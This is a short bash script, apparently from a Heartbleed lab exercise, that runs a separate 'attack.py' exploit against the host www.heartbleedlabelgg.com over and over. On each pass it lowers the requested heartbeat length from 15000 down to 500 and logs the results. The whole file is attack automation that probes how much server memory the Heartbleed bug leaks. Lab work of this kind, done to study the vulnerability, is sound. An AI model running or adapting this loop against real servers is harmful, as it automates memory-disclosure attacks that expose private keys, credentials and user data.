#!/bin/bash

# Initialize variables
TARGET="www.heartbleedlabelgg.com"
LOGFILE="heartbleed_decrease.log"
START_LENGTH=15000  # Starting length
DECREMENT=500      # Decrease length by this amount per iteration
MIN_LENGTH=500     # Minimum length to stop the loop

# Ensure the log file is empty or create it if it doesn't exist
> "$LOGFILE"

echo "Starting Heartbleed attack loop..." | tee -a "$LOGFILE"

# Loop through and decrease the length with each iteration
for ((len=$START_LENGTH; len>=$MIN_LENGTH; len-=$DECREMENT))
do
  echo "Running attack with length $len..." | tee -a "$LOGFILE"
  
  # Run the attack and append output to log file
  python2 attack.py $TARGET --length "$len" >> "$LOGFILE" 2>&1

  # Check if the command was successful
  if [ $? -ne 0 ]; then
    echo "Attack failed at length $len. Exiting." | tee -a "$LOGFILE"
    exit 1
  fi

  echo "Completed attack with length $len." | tee -a "$LOGFILE"
done

echo "Heartbleed attack loop finished." | tee -a "$LOGFILE"

